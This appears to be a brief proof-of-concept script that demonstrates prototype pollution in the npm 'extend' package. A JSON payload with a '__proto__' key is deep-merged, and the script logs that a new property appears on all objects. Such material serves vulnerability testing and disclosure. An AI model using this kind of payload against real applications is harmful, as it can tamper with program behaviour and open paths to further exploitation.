var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
let extend = require('extend');
let payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
var obj = {};
console.log({}.polluted);
extend(true, obj, payload);
console.log({}.polluted);